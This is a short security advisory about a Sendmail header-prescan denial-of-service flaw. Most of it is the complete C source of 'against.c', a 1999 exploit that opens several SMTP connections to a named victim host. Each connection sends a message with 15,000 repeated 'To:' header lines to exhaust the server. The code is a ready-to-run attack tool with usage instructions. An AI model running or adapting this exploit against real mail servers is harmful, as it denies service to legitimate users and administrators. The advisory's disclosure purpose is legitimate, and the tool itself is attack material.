source: http://www.securityfocus.com/bid/8674/info

Sendmail has been reported prone to a denial of service vulnerability when handling malicious SMTP mail headers. The vulnerability has been reported to present itself, due to an inefficient implementation of a header prescan algorithm.

A remote attacker may reportedly deny service to legitimate users by sending specially crafted emails to the affected service.

/*
	      against.c - Another Sendmail (and pine ;-) DoS (up to 8.9.2)
	      (c) 1999 by <marchew@linux.lepszy.od.kobiety.pl>
	
	      Usage: ./against existing_user_on_victim_host victim_host
	      Example: ./against nobody lamers.net
	
	    */
	
	    #include <stdio.h>
	    #include <unistd.h>
	    #include <sys/param.h>
	    #include <sys/socket.h>
	    #include <sys/time.h>
	    #include <netinet/in.h>
	    #include <netdb.h>
	    #include <stdarg.h>
	    #include <errno.h>
	    #include <signal.h>
	    #include <getopt.h>
	    #include <stdlib.h>
	    #include <string.h>
	
	    #define MAXCONN 4
	    #define LINES   15000
	
	    struct hostent *hp;
	    struct sockaddr_in s;
	    int suck,loop,x;
	
	    int main(int argc,char* argv[]) {
	
	      printf("against.c - another Sendmail DoS (up to 8.9.2)\n");
	
	      if (argc-3) {
		printf("Usage: %s victim_user victim_host\n",argv[0]);
		exit(0);
	      }
	
	      hp=gethostbyname(argv[2]);
	
	      if (!hp) {
		perror("gethostbyname");
		exit(1);
	      }
	
	      fprintf(stderr,"Doing mess: ");
	
	      for (;loop<MAXCONN;loop++) if (!(x=fork())) {
		FILE* d;
		bcopy(hp->h_addr,(void*)&s.sin_addr,hp->h_length);
		s.sin_family=hp->h_addrtype;
		s.sin_port=htons(25);
		if ((suck=socket(AF_INET,SOCK_STREAM,0))<0) perror("socket");
		if (connect(suck,(struct sockaddr *)&s,sizeof(s))) perror("connect");
		if (!(d=fdopen(suck,"w"))) { perror("fdopen"); exit(0); }
	
		usleep(100000);
	
		fprintf(d,"helo tweety\n");
		fprintf(d,"mail from: tweety@polbox.com\n");
		fprintf(d,"rcpt to: %s@%s\n",argv[1],argv[2]);
		fprintf(d,"data\n");
	
		usleep(100000);
	
		for(loop=0;loop<LINES;loop++) {
		  if (!(loop%100)) fprintf(stderr,".");
		  fprintf(d,"To: x\n");
		}
	
		fprintf(d,"\n\n\nsomedata\n\n\n");
	
		fprintf(d,".\n");
	
		sleep(1);
	
		fprintf(d,"quit\n");
		fflush(d);
	
		sleep(100);
		shutdown(suck,2);
		close(suck);
		exit(0);
	      }
	
	      waitpid(x,&loop,0);
	
	      fprintf(stderr,"ok\n");
	
	      return 0;
	    }